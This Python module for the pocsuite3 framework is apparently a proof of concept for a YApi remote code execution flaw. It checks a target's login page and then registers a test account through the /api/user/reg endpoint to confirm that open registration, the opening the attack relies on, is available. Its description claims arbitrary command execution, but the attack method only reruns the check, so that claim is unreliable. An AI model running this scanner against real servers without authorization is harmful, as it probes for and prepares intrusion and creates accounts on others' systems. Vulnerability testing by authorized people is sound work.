#!/usr/bin/env python
# -*- coding: utf-8 -*-
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class DemoPOC(POCBase):
    vulID = '000001'  # ssvid
    version = '3.0'
    author = ['drunk_kk']
    vulDate = '2000-00-00'
    createDate = '2000-00-00'
    updateDate = '2000-00-00'
    references = ['https://github.com/YMFE/yapi/issues/2229']
    name = 'YApi Remote Code Execution'
    appPowerLink = ''
    appName = 'YApi'
    appVersion = 'YApi 1.9X'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''YApi Remote Code Execution'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    pocDesc = '''在攻击模式下，可以通过command参数来指定任意命令,app_version用于选定版本'''


    def _verify(self):
        result = {}

        if self.url.endswith("/"):
            self.url = self.url[:-1]

        paylaod = self.url + "/login"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
        }
        try:
            r = req.get(paylaod,  headers=headers,verify=False)

            if r.status_code == 200 and "YApi" in r.text:

                headers1 = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json;charset=UTF-8",
                }
                data = '{"email":"testa1a@qq.com","password":"testaa@qq.com.","username":"testaa"}'
                
                paylaod1 = self.url + "/api/user/reg"
                
                r = req.post(paylaod1,data=data,headers=headers1,verify=False)
                if r.status_code == 200 and "username" in r.text:
                    result['VerifyInfo'] = {}
                if r.status_code == 200 and "该email已经注册" in r.text:
                    result['VerifyInfo'] = {}


        except:
            raise

        return self.parse_output(result)


    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)

